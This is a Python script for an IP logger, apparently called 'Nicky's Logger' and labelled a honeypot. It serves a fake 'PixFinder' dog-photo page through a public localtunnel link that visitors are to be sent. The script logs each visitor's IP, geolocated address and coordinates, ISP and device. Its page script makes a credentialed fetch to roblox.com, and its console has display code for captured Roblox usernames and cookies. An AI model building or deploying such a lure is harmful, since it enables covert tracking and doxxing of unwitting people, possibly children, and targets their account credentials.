import os
import sys
import logging
import json
import threading
import socket
import time
import subprocess
import re
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime

if sys.platform == 'win32':
    import msvcrt
else:
    import tty, termios

CONFIG = {
    "server_port": 8080,
    "log_file": "sentinel_audit.log",
    "target_service": "Roblox",
    "public_url": "https://great-moose-fold.loca.lt"
}

class AuditLogger:
    def __init__(self, log_file):
        self.log_file = log_file
        logging.basicConfig(
            filename=log_file,
            level=logging.INFO,
            format='%(asctime)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )

    def log_event(self, event_type, data):
        event = {
            "timestamp": datetime.utcnow().isoformat(),
            "event_type": event_type,
            "data": data
        }
        logging.info(json.dumps(event))
        return event

def get_geo_ip(ip):
    try:
        result = subprocess.run(
            ['curl', '-s', f'http://ip-api.com/json/{ip}'],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0:
            data = json.loads(result.stdout)
            if data.get('status') == 'success':
                return {
                    "city": data.get("city", "N/A"),
                    "region": data.get("regionName", "N/A"),
                    "country": data.get("country", "N/A"),
                    "isp": data.get("isp", "N/A"),
                    "zip": data.get("zip", "N/A"),
                    "lat": data.get("lat", "N/A"),
                    "lon": data.get("lon", "N/A"),
                    "org": data.get("org", "N/A"),
                    "as": data.get("as", "N/A")
                }
    except Exception:
        pass
    return {
        "city": "N/A", "region": "N/A", "country": "N/A", 
        "isp": "N/A", "zip": "N/A", "lat": "N/A", 
        "lon": "N/A", "org": "N/A", "as": "N/A"
    }

class HoneypotHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def end_headers(self):
        self.send_header('bypass-tunnel-reminder', 'true')
        super().end_headers()

    def do_GET(self):
        client_ip = self.client_address[0]
        geo_data = get_geo_ip(client_ip)
        user_agent = self.headers.get('User-Agent', 'Unknown')
        accept_lang = self.headers.get('Accept-Language', 'Unknown')
        
        is_mobile = any(device in user_agent.lower() for device in ['android', 'iphone', 'mobile', 'safari'])
        
        event = AUDIT_LOGGER.log_event("IP_CAPTURE", {
            "ip": client_ip, 
            "path": self.path,
            "city": geo_data.get("city", "N/A"),
            "region": geo_data.get("regionName", "N/A"),
            "country": geo_data.get("country", "N/A"),
            "isp": geo_data.get("isp", "N/A"),
            "zip": geo_data.get("zip", "N/A"),
            "lat": geo_data.get("lat", "N/A"),
            "lon": geo_data.get("lon", "N/A"),
            "org": geo_data.get("org", "N/A"),
            "as": geo_data.get("as", "N/A"),
            "device": "Mobile" if is_mobile else "Desktop",
            "user_agent": user_agent,
            "language": accept_lang
        })
        
        if APP_INSTANCE:
            APP_INSTANCE.event_queue.append(event)

        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html = """
            <!DOCTYPE html>
            <html>
            <head>
                <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
                <title>PixFinder - HD Stock Photos</title>
                <style>
                    * { box-sizing: border-box; }
                    body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #202124; color: #e8eaed; -webkit-text-size-adjust: 100%; }
                    .header { background-color: #171717; padding: 15px 20px; border-bottom: 1px solid #3c4043; position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 15px; }
                    .logo { color: #8ab4f8; font-weight: bold; font-size: 20px; text-decoration: none; }
                    .search-box { background: #303134; border: 1px solid #5f6368; border-radius: 24px; padding: 10px 20px; color: #e8eaed; width: 100%; font-size: 16px; outline: none; }
                    .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; padding: 10px; }
                    @media (min-width: 600px) { .grid { grid-template-columns: repeat(3, 1fr); } }
                    @media (min-width: 900px) { .grid { grid-template-columns: repeat(4, 1fr); } }
                    .img-card { background: #303134; border-radius: 8px; overflow: hidden; cursor: pointer; position: relative; padding-top: 100%; }
                    .img-inner { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; }
                    .img-placeholder { flex: 1; background: linear-gradient(135deg, #3c4043 0%, #2d2d2d 100%); display: flex; align-items: center; justify-content: center; font-size: 40px; }
                    .img-title { padding: 8px; font-size: 11px; color: #bdc1c6; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
                    .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; display: none; justify-content: center; align-items: center; padding: 20px; }
                    .modal { background: #303134; padding: 25px; border-radius: 12px; text-align: center; width: 100%; max-width: 350px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
                    .loader { border: 4px solid #3c4043; border-top: 4px solid #8ab4f8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
                    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                    .fail-msg { color: #f28b82; font-size: 13px; margin-top: 15px; display: none; line-height: 1.4; }
                    .btn { background: #8ab4f8; color: #202124; border: none; padding: 12px; border-radius: 4px; width: 100%; font-weight: bold; margin-top: 15px; cursor: pointer; font-size: 16px; }
                </style>
            </head>
            <body>
                <div class="header">
                    <a href="#" class="logo">PixFinder</a>
                    <input type="text" class="search-box" value="cute dog images" readonly>
                </div>
                
                <div class="grid">
                    <div class="img-card" onclick="attemptAuth()">
                        <div class="img-inner"><div class="img-placeholder">&#x1F415;</div><div class="img-title">Golden Retriever Puppy</div></div>
                    </div>
                    <div class="img-card" onclick="attemptAuth()">
                        <div class="img-inner"><div class="img-placeholder" style="background: linear-gradient(135deg, #4a4c4f 0%, #2d2d2d 100%)">&#x1F415;&#x200D;&#x1F9BA;</div><div class="img-title">Shiba Inu Sitting</div></div>
                    </div>
                    <div class="img-card" onclick="attemptAuth()">
                        <div class="img-inner"><div class="img-placeholder" style="background: linear-gradient(135deg, #5f6368 0%, #2d2d2d 100%)">&#x1F436;</div><div class="img-title">Husky Howling</div></div>
                    </div>
                    <div class="img-card" onclick="attemptAuth()">
                        <div class="img-inner"><div class="img-placeholder" style="background: linear-gradient(135deg, #6e7073 0%, #2d2d2d 100%)">&#x1F9AE;</div><div class="img-title">Corgi on Beach</div></div>
                    </div>
                    <div class="img-card" onclick="attemptAuth()">
                        <div class="img-inner"><div class="img-placeholder" style="background: linear-gradient(135deg, #3c4043 0%, #1a1a1a 100%)">&#x1F43E;</div><div class="img-title">Beagle Puppies</div></div>
                    </div>
                    <div class="img-card" onclick="attemptAuth()">
                        <div class="img-inner"><div class="img-placeholder" style="background: linear-gradient(135deg, #4a4c4f 0%, #1a1a1a 100%)">&#x1F429;</div><div class="img-title">Poodle Grooming</div></div>
                    </div>
                </div>

                <div id="auth-overlay" class="overlay">
                    <div class="modal">
                        <div id="spinner" class="loader"></div>
                        <h2 style="color:#8ab4f8; margin:10px 0; font-size:16px;">Verifying HD Access...</h2>
                        <div id="fail-msg" class="fail-msg">
                            Browser security blocked cross-origin session read. Sandbox is intact.
                        </div>
                        <button class="btn" onclick="closeModal()">Close</button>
                    </div>
                </div>

                <script>
                    function attemptAuth() {
                        document.getElementById('auth-overlay').style.display = 'flex';
                        
                        fetch('https://www.roblox.com/', { 
                            mode: 'no-cors',
                            credentials: 'include'
                        }).then(response => {
                            document.getElementById('spinner').style.display = 'none';
                            document.getElementById('fail-msg').style.display = 'block';
                        }).catch(error => {
                            document.getElementById('spinner').style.display = 'none';
                            document.getElementById('fail-msg').style.display = 'block';
                        });
                    }
                    
                    function closeModal() {
                        document.getElementById('auth-overlay').style.display = 'none';
                        document.getElementById('spinner').style.display = 'block';
                        document.getElementById('fail-msg').style.display = 'none';
                    }
                </script>
            </body>
            </html>
            """
            self.wfile.write(html.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()


class ServerThread(threading.Thread):
    def __init__(self, port):
        super().__init__(daemon=True)
        self.port = port
        self.server = None

    def run(self):
        try:
            self.server = HTTPServer(('0.0.0.0', self.port), HoneypotHandler)
            self.server.serve_forever()
        except Exception as e:
            if APP_INSTANCE:
                APP_INSTANCE.event_queue.append(AUDIT_LOGGER.log_event("ERROR", {"details": str(e)}))

    def stop(self):
        if self.server:
            self.server.shutdown()


class TunnelThread(threading.Thread):
    def __init__(self, port):
        super().__init__(daemon=True)
        self.process = None
        self.public_url = "PENDING..."
        self.port = port

    def run(self):
        try:
            self.process = subprocess.Popen(
                f'lt --port {self.port}',
                stdout=subprocess.PIPE, 
                stderr=subprocess.STDOUT,
                text=True,
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
            )
            
            url_pattern = re.compile(r'https://[a-zA-Z0-9\-]+\.loca\.lt')
            
            while True:
                line = self.process.stdout.readline()
                if not line:
                    break
                
                match = url_pattern.search(line)
                if match:
                    self.public_url = match.group(0)
                    if APP_INSTANCE:
                        APP_INSTANCE.needs_redraw = True
                    break
                
        except Exception as e:
            self.public_url = f"ERROR: {str(e)}"
            if APP_INSTANCE:
                APP_INSTANCE.needs_redraw = True

    def stop(self):
        if self.process:
            self.process.terminate()


def get_key():
    if sys.platform == 'win32':
        if msvcrt.kbhit():
            return msvcrt.getch().decode('utf-8', errors='ignore')
        return None
    else:
        import select
        if select.select([sys.stdin], [], [], 0)[0]:
            return sys.stdin.read(1)
        return None

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

def move_cursor(row, col):
    print(f"\033[{row};{col}H", end='')

def clear_line():
    print("\033[2K", end='')

class NickysLoggerUI:
    def __init__(self):
        self.server_thread = None
        self.tunnel_thread = None
        self.event_queue = []
        self.logged_data = []
        self.active = True
        self.current_view = "MENU"
        self.needs_redraw = True

    def draw_menu(self):
        move_cursor(1, 1)
        print("\033[91m  _   _ _   _ _   _ _____  ____   ____  _   _    \033[0m")
        print("\033[91m | \\ | | | | | \\ | |_   _|/ ___| / ___|| | | |   \033[0m")
        print("\033[91m |  \\| | | | |  \\| | | |  \\___ \\| |    | |_| |   \033[0m")
        print("\033[91m | |\\  | |_| | |\\  | | |   ___) | |___ |  _  |   \033[0m")
        print("\033[91m |_| \\_|\\___/|_| \\_| |_|  |____/ \\____||_| |_|   \033[0m")
        print("\033[91m  _       _                           \033[0m")
        print("\033[91m | |     | |                          \033[0m")
        print("\033[91m | |_ ___| | ___ _ __ ___   __ _ _ __ \033[0m")
        print("\033[91m | __/ _ \\ |/ _ \\ '_ ` _ \\ / _` | '__|\033[0m")
        print("\033[91m | ||  __/ |  __/ | | | | | (_| | |   \033[0m")
        print("\033[91m  \\__\\___|_|\\___|_| |_| |_|\\__,_|_|   \033[0m")
        print("\n")
        print("\033[92m [1] WEBSITE MAKER\033[0m  - Deploy Honeypot")
        print("\033[92m [2] INFO\033[0m          - View Captured Logs")
        print("\n")
        move_cursor(16, 1)
        clear_line()
        print("Select one of the options > ")

    def draw_website(self):
        move_cursor(1, 1)
        print("\033[91m=== WEBSITE MAKER ===\033[0m\n")
        
        if self.server_thread and self.server_thread.is_alive():
            print("Honeypot Status: \033[92mACTIVE\033[0m")
            print(f"Public URL: \033[96m{CONFIG['public_url']}\033[0m")
            print("\n\033[93m[!] Send this link to ANY device on ANY network.\033[0m")
            print("\033[93m[!] Update GitHub index.html to match this URL.\033[0m")
            print("\nWaiting for connections...")
        else:
            print("Honeypot Status: \033[91mINACTIVE\033[0m")
            print("Press \033[92mENTER\033[0m to deploy honeypot")
        
        print("\033[90mPress ESC to return to menu\033[0m\n")
        print("\033[93m--- LIVE FEED ---\033[0m")
        
        start_y = 12
        for i, event in enumerate(self.logged_data[-6:]):
            move_cursor(start_y + i, 1)
            clear_line()
            ts = event.get("timestamp", "UNKNOWN")[-9:]
            etype = event.get("event_type", "UNKNOWN")
            data = event.get("data", {})
            if etype == "IP_CAPTURE":
                dev = data.get('device', 'Unknown')
                print(f"\033[96m[{ts}] [VISIT] IP: {data.get('ip')} | {dev} | {data.get('city')}, {data.get('country')}\033[0m")
            elif etype == "CREDENTIAL_CAPTURE":
                print(f"\033[92m[{ts}] [CAPTURE] User: {data.get('username')} | Cookie: {data.get('roblox_cookie')}\033[0m")

    def draw_info(self):
        move_cursor(1, 1)
        print("\033[91m=== CAPTURED INFO ===\033[0m\n")
        print("\033[90mPress ESC to return to menu\033[0m\n")
        
        if not self.logged_data:
            print("\033[90mNo data captured yet.\033[0m")
        else:
            for i, event in enumerate(self.logged_data[-15:]):
                move_cursor(5 + i, 1)
                clear_line()
                ts = event.get("timestamp", "UNKNOWN")
                etype = event.get("event_type", "UNKNOWN")
                data = event.get("data", {})
                
                if etype == "IP_CAPTURE":
                    print(f"\033[96m[{ts}] [VISIT] IP: {data.get('ip')} | {data.get('device')}\033[0m")
                    print(f"    Location: {data.get('city')}, {data.get('zip')} {data.get('region')}, {data.get('country')}")
                    print(f"    Geo: {data.get('lat')},{data.get('lon')} | ISP: {data.get('isp')} | Org: {data.get('org')}")
                elif etype == "CREDENTIAL_CAPTURE":
                    print(f"\033[92m[{ts}] [CAPTURE] User: {data.get('username')} | Cookie: {data.get('roblox_cookie')}\033[0m")

    def process_events(self):
        if self.event_queue:
            self.logged_data.extend(self.event_queue)
            self.event_queue.clear()
            self.needs_redraw = True

    def deploy(self):
        if not (self.server_thread and self.server_thread.is_alive()):
            self.server_thread = ServerThread(CONFIG['server_port'])
            self.server_thread.start()
            
            self.tunnel_thread = TunnelThread(CONFIG['server_port'])
            self.tunnel_thread.start()
            
            self.needs_redraw = True

    def shutdown(self):
        if self.server_thread and self.server_thread.is_alive():
            self.server_thread.stop()
        if self.tunnel_thread:
            self.tunnel_thread.stop()

    def run(self):
        if sys.platform != 'win32':
            old_settings = termios.tcgetattr(sys.stdin)
            try:
                tty.setcbreak(sys.stdin.fileno())
                self._main_loop()
            finally:
                termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
        else:
            self._main_loop()

    def _main_loop(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        
        while self.active:
            self.process_events()

            if self.tunnel_thread and self.tunnel_thread.public_url != "PENDING..." and self.current_view == "WEBSITE":
                self.needs_redraw = True

            if self.needs_redraw:
                if self.current_view == "MENU":
                    self.draw_menu()
                elif self.current_view == "WEBSITE":
                    self.draw_website()
                elif self.current_view == "INFO":
                    self.draw_info()
                self.needs_redraw = False
            
            time.sleep(0.1)
            
            key = get_key()
            if key is None:
                continue

            if self.current_view == "MENU":
                if key == '1':
                    self.current_view = "WEBSITE"
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.needs_redraw = True
                elif key == '2':
                    self.current_view = "INFO"
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.needs_redraw = True
            elif self.current_view == "WEBSITE":
                if key == chr(27):
                    self.current_view = "MENU"
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.needs_redraw = True
                elif key == '\r' or key == '\n':
                    self.deploy()
            elif self.current_view == "INFO":
                if key == chr(27):
                    self.current_view = "MENU"
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.needs_redraw = True

        self.shutdown()


AUDIT_LOGGER = AuditLogger(CONFIG['log_file'])
APP_INSTANCE = None

if __name__ == "__main__":
    APP_INSTANCE = NickysLoggerUI()
    try:
        APP_INSTANCE.run()
    except KeyboardInterrupt:
        APP_INSTANCE.shutdown()
        os.system('cls' if os.name == 'nt' else 'clear')
        print("Exiting...")